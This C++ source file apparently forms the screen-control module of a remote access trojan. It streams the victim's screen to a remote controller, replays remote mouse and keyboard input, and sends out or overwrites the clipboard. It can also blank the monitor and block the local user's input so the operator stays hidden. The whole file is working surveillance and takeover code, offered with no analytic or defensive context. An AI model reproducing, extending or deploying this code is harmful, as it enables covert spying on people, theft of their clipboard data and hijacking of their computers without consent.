// ScreenManager.cpp: implementation of the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#include "ScreenManager.h"
#include "until.h"
typedef struct
{
	DWORD	dwCtrlID;
	BOOL	bMove;
	WORD	x;
	WORD	y;
	UINT	uChar;
	UINT	nFlags;
}MOUSEKEYCTRL,*PMOUSEKEYCTRL;


typedef BOOL ( __stdcall *TBlockInput)(BOOL); 

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
{
	m_pScreenSpy = new CScreenSpy(8);
	m_bIsWorking = true;
	m_bIsDialogOpen	= false;
	m_bIsBlankScreen = false;
	m_bIsBlockInput = false;
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
	m_hBlankThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, this, 0, NULL, true);
}

CScreenManager::~CScreenManager()
{
	InterlockedExchange((LPLONG)&m_bIsBlankScreen, false);
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hBlankThread, INFINITE);
	CloseHandle(m_hWorkThread);
	CloseHandle(m_hBlankThread);

	if (m_pScreenSpy)
		delete m_pScreenSpy;
}

void CScreenManager::ResetScreen(int biBitCount)
{
	m_bIsWorking = false;
	m_bIsBlankScreen = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hBlankThread, INFINITE);
	CloseHandle(m_hWorkThread);
	CloseHandle(m_hBlankThread);

	delete m_pScreenSpy;


	if (biBitCount == 3)		// 4位灰度
		m_pScreenSpy = new CScreenSpy(4, true);
	else if (biBitCount == 7)	// 8位灰度
		m_pScreenSpy = new CScreenSpy(8, true);
	else
		m_pScreenSpy = new CScreenSpy(biBitCount);

	m_bIsWorking = true;
	m_bIsBlankScreen = false;
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
	m_hBlankThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, this, 0, NULL, true);

}

void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	try
	{
 		switch (lpBuffer[0])
 		{
		case COMMAND_NEXT:
			InterlockedExchange((LPLONG)&m_bIsDialogOpen, true);
			break;
		case COMMAND_SCREEN_RESET:
			ResetScreen(*(LPDWORD)&lpBuffer[1]);
			break;
		case COMMAND_SCREEN_CTRL_ALT_DEL:
			::SimulateCtrlAltDel();
			break;
		case COMMAND_SCREEN_CONTROL:
			ProcessCommand(lpBuffer + 1, nSize - 1);
			break;
		case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
			m_bIsBlockInput = !m_bIsBlockInput;
			break;
		case COMMAND_SCREEN_BLANK:
			m_bIsBlankScreen = !m_bIsBlankScreen;
			break;
		case COMMAND_SCREEN_GET_CLIPBOARD:
			SendLocalClipboard();
			break;
		case COMMAND_SCREEN_SET_CLIPBOARD:
			UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
			break;
		default:
			break;
		}
	}catch(...){}
}

void CScreenManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
	LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
	lpBuffer[0] = TOKEN_BITMAPINFO;
	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	VirtualFree(lpBuffer, 0, MEM_RELEASE);	
}

void CScreenManager::sendFirstScreen()
{
	BOOL	bRet = false;
	LPVOID	lpFirstScreen = NULL;

	lpFirstScreen = m_pScreenSpy->getFirstScreen();
	if (lpFirstScreen == NULL)
		return;

	DWORD	dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_FIRSTSCREEN;
	memcpy(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);

	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}

void CScreenManager::sendNextScreen()
{
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);
	
	if (dwBytes == 0 || !lpNetScreen)
		return;

	DWORD	dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
		return;
	
	lpBuffer[0] = TOKEN_NEXTSCREEN;
	memcpy(lpBuffer + 1, (const char *)lpNetScreen, dwBytes);


	Send(lpBuffer, dwBytesLength);
	
	delete [] lpBuffer;
}

DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
{
	// 控制端强制关闭时会出错
   	try
   	{
		CScreenManager *pThis = (CScreenManager *)lparam;

		pThis->sendBITMAPINFO();
		// 等控制端对话框打开
		pThis->WaitForDialogOpen();
		pThis->sendFirstScreen();

		while (pThis->m_bIsWorking)
			pThis->sendNextScreen();

	}catch(...){};
	return 0;
}

DWORD WINAPI CScreenManager::ControlThread(LPVOID lparam)
{
	static	bool bIsScreenBlanked = false;
	CScreenManager *pThis = (CScreenManager *)lparam;
	HMODULE	hModule = ::GetModuleHandle("user32");
	TBlockInput BlockInput = (TBlockInput)GetProcAddress(hModule, "BlockInput");
	while (pThis->m_bIsWorking)
	{
		// 加快反应速度
		for (int i = 0; i < 100; i++)
		{
			if (pThis->m_bIsWorking)
				Sleep(10);
			else
				break;
		}
		if (pThis->m_bIsBlankScreen)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
		}
		else
		{
			if (bIsScreenBlanked)
			{
				SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
				SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
				bIsScreenBlanked = false;
			}
		}
		BlockInput(pThis->m_bIsBlockInput);
	}

	BlockInput(false);
	CloseHandle(hModule);
	return -1;
}

void CScreenManager::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
{
	// 数据包不合法
	if (nSize % sizeof(MOUSEKEYCTRL) != 0)
		return;

	SwitchInputDesktop();

	// 命令个数
	int	nCount = nSize / sizeof(MOUSEKEYCTRL);

	// 处理多个命令
	for (int i = 0; i < nCount; i++)
	{
		MOUSEKEYCTRL	*lpmkc = (MOUSEKEYCTRL *)(lpBuffer + i * sizeof(MOUSEKEYCTRL));
		POINT point;
		point.x = lpmkc->x;
		point.y = lpmkc->y;
		if (lpmkc->bMove)
		{
			SetCursorPos(point.x, point.y);
			SetCapture(WindowFromPoint(point));
		}
		switch(lpmkc->dwCtrlID)
		{
			case WM_LBUTTONDOWN:
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				break;
			case WM_LBUTTONUP:
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				break;
			case WM_RBUTTONDOWN:
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
				break;
			case WM_RBUTTONUP:
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				break;
 			case WM_LBUTTONDBLCLK:
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
 				break;
 			case WM_RBUTTONDBLCLK:
 				mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
 				break;
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:	
				keybd_event(lpmkc->uChar, MapVirtualKey(lpmkc->uChar, 0), 0, 0);
				break;	
			case WM_KEYUP:
			case WM_SYSKEYUP:
				keybd_event(lpmkc->uChar, MapVirtualKey(lpmkc->uChar, 0), KEYEVENTF_KEYUP, 0);
				break;
			default:
				break;
		}
	}	
}

void CScreenManager::UpdateLocalClipboard( char *buf, int len )
{
	if (!::OpenClipboard(NULL))
		return;
	
	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, len);
	if (hglbCopy != NULL) { 
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CScreenManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb); 
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete [] lpData;
}

void CScreenManager::WaitForDialogOpen()
{
	while (!m_bIsDialogOpen)
		Sleep(100);
}
